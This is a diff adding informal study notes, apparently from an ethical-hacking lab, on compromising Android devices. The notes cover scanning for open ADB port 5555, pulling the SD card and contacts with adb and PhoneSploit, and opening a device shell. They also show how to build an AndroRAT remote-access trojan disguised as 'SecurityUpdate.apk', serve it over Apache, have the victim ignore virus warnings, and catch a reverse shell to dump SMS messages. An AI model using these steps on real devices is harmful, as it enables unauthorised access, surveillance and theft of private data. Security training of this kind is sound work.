@@ -1,0 +1,133 @@
+Android device - need to hack - and check the content , dont required password port open can connected directly 
+nmap -p 5555 --open -sV IP/24   scan ip related to android 
+adb connect 192.168.10.121
+adb pull /sdcard /home/attacker   move file from adnroid device to parrot security 
+find .txt file and copy to windows
+sudo find / -type f -name "BCtetx.txt" 2>/dev/null    - search and locate file
+
+text file can be decypted if we have password with bctextencoder 
+
+apk file file use 
+cd Phonesploit
+python phonesploit.py
+type 1 and enter ip address OF remote server to connect server
+36 to extrack apk file details 
+below command to check crc value 
+crc32 /home/attacker/apkfilename | grep VALUETOSEARCH
+
+
+call logs - go to sd cards and calls folder 
+
+
+
+34 for contatct dump
+* means space 
+
+
+
+
+
+
+----
+
+ cd PhoneSploit-Pro command to navigate to the PhoneSploit-Pro folder.
+ 
+  execute python3 phonesploitpro.py command to run the tool
+  
+  type 6 and press Enter to choose Get Screenshot.
+  
+  
+  type 13 and press Enter to choose List Installed Apps.
+  
+  
+  	17. Now, at the Main Menu prompt, type 10 and press Enter to choose Run an app. In this example, we will launch a calculator app on the target Android device.
+Based on the information obtained in the previous step about the installed applications, you can launch any app of your choice.
+	18. Type 2 and press Enter to Enter Package Name Manually.
+	19. To launch the calculator app, type com.android.calculator2 and press Enter.
+
+
+
+type 14 and press Enter to choose Access Device Shell.
+
+ type pwd and press Enter to view the present working directory on the target Android device.
+ 
+ 
+ls
+cd sdcard 
+
+ type 23 and press Enter to choose Open a Link on Device.
+ 
+ 
+ 	37. When prompted to Enter URL, type the desired URL (in this case, https://pranx.com/hacker/) and press Enter.
+
+
+
+type 27 and press Enter to choose the Get Device Information option.
+	41. The result appears, displaying device information of the target Android device, as shown in the screenshot.
+For demonstration purposes, in this task, we are exploiting the Android emulator machine. However, in real life, attackers use the Shodan search engine to find ADB-enabled devices and exploit them to gain sensitive information and carry out malicious activities.
+	
+
+
+
+
+  
+
+
+
+-=---
+
+
+AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it. AndroRAT is a client/server application developed in Java Android for the client side and the Server is in Python
+
+	2. Run cd AndroRAT command to navigate to the AndroRAT repository.
+	3. Run python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk command to create an APK file (here, SecurityUpdate.apk).
+	• --build: is used for building the APK
+	• -i: specifies the local IP address (here, 10.10.1.13)
+	• -p: specifies the port number (here, 4444)
+	• -o: specifies the output APK file (here, SecurityUpdate.apk)
+You can observe that an APK file (SecurityUpdate.apk) is generated at the location /home/attacker/AndroRAT/.
+
+
+	5. Run cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ command to copy the SecurityUpdate.apk file to the location share folder.
+If the share folder does not exist, then execute the following commands to create a share folder and assign required permissions to it:
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share command
+	• Run chown -R www-data:www-data /var/www/html/share command
+	6. Execute service apache2 start command to start an Apache web server.
+
+
+	7. Now, run python3 androRAT.py --shell -i 0.0.0.0 -p 4444 command to start listening to the victim's machine.
+	• --shell: is used for getting the interpreter
+	• -i: specifies the IP address for listening (here, 0.0.0.0)
+	• -p: specifies the port number (here, 4444)
+	8. You can observe that AndroRAT starts waiting for a connection.
+
+
+	9. Click Android to switch to the Android emulator machine.
+	10. If the Android machine is non-responsive then, click the Commands icon from the top section of the screen and navigate to Power and Display --> Reset/Reboot machine.
+If Reset/Reboot machine pop-up appears, click Yes to proceed.
+	11. In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch the browser
+
+
+	12. In the address bar, type http://10.10.1.13/share and press Enter.
+If a Browse faster. Use less data. notification appears, click No thanks.
+If a pop up appears, click Allow.
+	13. The Index of /share page appears; click SecurityUpdate.apk to download the application package file.
+	14. If Chrome needs storage access to download files, a pop-up appears; click Continue. If any pop-up appears stating that the file contains a virus, ignore the message and download the file anyway.
+In Allow Chrome to access photos, media, and files on your device?, click ALLOW.
+	15. If File can't be downloaded securely pop-up appears click Keep.
+	16. After the file downloads, File downloaded pop-up appears, click Open.
+
+ type deviceInfo and press Enter to view the device related information.
+
+
+	23. Type getSMS inbox and press Enter to obtain a file containing SMSes from the inbox of a victim device.
+	24. This file is stored at the location /home/attacker/AndroRAT/Dumps.
+
+
+
+	25. Type getMACAddress and press Enter to view the MAC address of the victim's device.
+
+
+
+
